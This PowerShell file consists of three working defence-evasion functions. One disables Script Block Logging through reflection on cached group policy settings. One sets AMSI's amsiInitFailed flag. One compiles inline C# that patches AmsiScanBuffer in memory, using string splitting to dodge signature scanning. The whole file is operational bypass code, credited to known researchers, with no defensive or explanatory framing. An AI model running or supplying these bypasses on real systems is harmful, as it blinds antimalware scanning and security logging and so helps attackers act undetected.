function Invoke-BypassScriptBlockLog {
    # cobbr's Script Block Logging bypass
    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
    If($GPF){
        $GPC=$GPF.GetValue($null);
        If($GPC['ScriptB'+'lockLogging']){
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
        }
        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
        $val.Add('EnableScriptB'+'lockLogging',0);
        $val.Add('EnableScriptB'+'lockInvocationLogging',0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
    } Else {
        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
    }
}

function Invoke-BypassAMSI {
    # @mattifestation's AMSI bypass
    $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
    $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
}

function Invoke-BypassAMSI2 {
    # rastamouse's AMSI bypass (Add-Type writes *.cs on disk!!)
    $id = get-random;
    $Ref = (
    "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
    );

    $Source = @"
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI$id
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
            string buffer="";
            string[] hexbuffersplit = hexbuffer.Split(' ');
            foreach (String hex in hexbuffersplit)
            {
                int value = Convert.ToInt32(hex, 16);
                buffer+= Char.ConvertFromUtf32(value);
            }
            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
            UIntPtr size = (UIntPtr)5;
            uint p = 0;
            VirtualProtect(Address, size, 0x40, out p);
            byte c1=0xB8,c2=0x80;			 
            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
        }
    }
}
"@;

    Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
    iex "[Bypass.AMSI$id]::Disable() | Out-Null"
}
